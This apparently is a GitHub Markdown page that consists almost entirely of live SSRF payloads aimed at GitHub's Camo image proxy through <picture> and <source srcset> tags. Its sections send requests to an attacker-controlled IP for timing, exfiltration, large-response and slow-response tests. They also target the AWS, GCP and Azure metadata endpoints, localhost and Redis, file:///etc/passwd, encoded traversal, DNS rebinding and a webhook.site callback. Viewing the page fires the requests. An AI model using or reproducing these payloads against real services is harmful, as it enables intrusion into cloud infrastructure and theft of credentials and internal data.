# 🔴 SSRF Validation Tests

Testing GitHub Camo proxy SSRF vulnerability via `<picture>` and `<source srcset>` elements.

---

## Basic SSRF Confirmation
<picture>
  <source srcset="https://oob.example.com/ssrf-test-1">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Test 1">
</picture>

---

## Timing Attack Test
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-2-timing?delay=10">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Timing Test">
</picture>

---

## Data Exfiltration Test
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-3-data?data=github-internal-secret">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Data Test">
</picture>

---

## Header Analysis Test
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-4-headers">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Header Test">
</picture>

---

## Redirect Following Test
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-5-redirect?step=1">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Redirect Test">
</picture>

---

## Large Response Test (50MB)
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-6-large?size=50">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Large Test">
</picture>

---

## Slow Response Test (30s)
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-7-slow?duration=30">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Slow Test">
</picture>

---

## Protocol Confusion Tests
<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-8-protocols?protocol=ftp">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="FTP Test">
</picture>

<picture>
  <source srcset="http://164.90.187.218:8080/ssrf-test-8-protocols?protocol=ldap">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="LDAP Test">
</picture>

---

## Internal Service Simulation
<picture>
  <source srcset="http://164.90.187.218:8080/simulate-internal?service=aws-metadata">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="AWS Test">
</picture>

<picture>
  <source srcset="http://164.90.187.218:8080/simulate-internal?service=redis-info">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Redis Test">
</picture>

<picture>
  <source srcset="http://164.90.187.218:8080/simulate-internal?service=mysql-status">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="MySQL Test">
</picture>

---

## AWS Metadata SSRF Tests

### IMDSv1 Test
<picture>
  <source srcset="http://169.254.169.254/latest/meta-data/">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="AWS IMDSv1">
</picture>

### GCP Metadata Test
<picture>
  <source srcset="http://metadata.google.internal/computeMetadata/v1/">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="GCP Metadata">
</picture>

### Azure Metadata Test
<picture>
  <source srcset="http://169.254.169.254/metadata/instance?api-version=2021-02-01">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Azure Metadata">
</picture>

---

## localhost/internal Tests
<picture>
  <source srcset="http://localhost:8080/admin">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="localhost">
</picture>

<picture>
  <source srcset="http://127.0.0.1:6379/info">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Redis">
</picture>

<picture>
  <source srcset="http://[::1]:80/">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="IPv6 localhost">
</picture>

<picture>
  <source srcset="http://0.0.0.0:80/">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="0.0.0.0">
</picture>

---

## DNS Rebinding Test
<picture>
  <source srcset="http://rebind.network/ssrf-test">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="DNS Rebind">
</picture>

---

## URL Encoding Bypass
<picture>
  <source srcset="http://164.90.187.218:8080/%2e%2e/%2e%2e/etc/passwd">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Path Traversal">
</picture>

<picture>
  <source srcset="http://164.90.187.218:8080/ssrf?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="URL Encoded">
</picture>

---

## Multiple srcset URLs
<picture>
  <source srcset="http://164.90.187.218:8080/test1 1x, http://164.90.187.218:8080/test2 2x">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Multi srcset">
</picture>

---

## File Protocol Test
<picture>
  <source srcset="file:///etc/passwd">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="File Protocol">
</picture>

---

## Webhook.site Test (Replace with your ID)
<picture>
  <source srcset="https://webhook.site/YOUR-UNIQUE-ID-HERE?test=github-ssrf">
  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Webhook Test">
</picture>
